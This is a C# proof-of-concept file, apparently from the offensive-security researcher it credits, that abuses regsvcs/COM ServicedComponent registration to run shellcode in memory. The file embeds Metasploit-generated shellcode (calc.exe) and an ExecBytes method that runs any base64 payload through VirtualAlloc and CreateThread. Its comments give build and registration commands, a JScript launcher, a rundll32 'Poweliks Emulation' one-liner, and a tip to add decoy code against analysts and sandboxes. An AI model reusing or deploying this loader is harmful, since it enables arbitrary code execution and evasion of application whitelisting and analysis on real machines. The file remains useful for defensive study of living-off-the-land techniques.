using System;
using System.EnterpriseServices;
using System.Runtime.InteropServices;


/*
Author: Casey Smith, Twitter: @subTee
License: BSD 3-Clause
Create Your Strong Name Key -> key.snk
$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='
$Content = [System.Convert]::FromBase64String($key)
Set-Content key.snk -Value $Content -Encoding Byte


C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /r:System.EnterpriseServices.dll /target:library /out:dllguest.dll /keyfile:key.snk dllguest.cs
 
//Requires Admin Rights to Register 
C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe dllguest.dll
[OR]
From Administrative x86 PowerShell
[reflection.Assembly]::LoadWithPartialName("system.enterpriseservices")
$helper = New-Object System.EnterpriseServices.RegistrationHelper
$a = 'JS'
$b = $null
$helper.InstallAssembly('dllguest.dll',( [ref] $a) ,( [ref] $b),  [System.EnterpriseServices.InstallationFlags]::CreateTargetApplication)

From Jscript
//Crashes Script Host Investigating
var o = new ActiveXObject("JS");
o.Exec();

From Jscript raw Shellcode
var o = new ActiveXObject("JS");
var b64Data = '/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu+AdKgpoppW9nf/VPAZ8CoD74HUFu0cTcm9qAFP/1WNhbGMuZXhlAA==';	
o.ExecBytes(b64Data);

Poweliks Emulation
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=new%20ActiveXObject("JS");o.Exec();

Cleanup
C:\Windows\Microsoft.NET\Framework\v2.0.50727\regsvcs.exe /U dllguest.dll

*/
[assembly: ApplicationActivation(ActivationOption.Server)]
[assembly: ApplicationAccessControl(false)]
namespace dllguest
{
    [ComVisible(true)]
    [Guid("31D2B969-ACDC-FACE-9D8E-C0FFEEA5ACDC")]
    [ClassInterface(ClassInterfaceType.AutoDispatch)]	
    [ProgId("JS")]    
    public class Bypass : ServicedComponent
    {
        public Bypass() {  } 
		
		public void Exec()
		{
			Shellcode.Exec();
		}

		public void ExecBytes(string a)
		{
			Shellcode.ExecBytes(a);
		}
		
    }

    public class Program
    {

        static void Main(string[] args)
        {
            Console.WriteLine("Hello, World!");
			//Add any additional functionality to distract/confuse analysts and sandbox execution.
			
        }
    }

    public class Shellcode
    {
        public static void Exec()
        {
            // native function's compiled code
            // generated with metasploit
            // executes calc.exe
            byte[] shellcode = new byte[193] {
			0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
			0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
			0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
			0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
			0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
			0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
			0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
			0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
			0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
			0x8d,0x5d,0x6a,0x01,0x8d,0x85,0xb2,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,
			0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,
			0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
			0x00,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x2e,0x65,0x78,0x65,0x00 };



            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data


            IntPtr pinfo = IntPtr.Zero;

            // execute native code

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }
		
		public static void ExecBytes(string b64)
        {
            byte[] shellcode = Convert.FromBase64String(b64);
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;
            // prepare data


            IntPtr pinfo = IntPtr.Zero;

            // execute native code

            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        private static UInt32 MEM_COMMIT = 0x1000;

        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);


        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          ref UInt32 lpThreadId

          );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(

          IntPtr hHandle,
          UInt32 dwMilliseconds
          );


    }

}
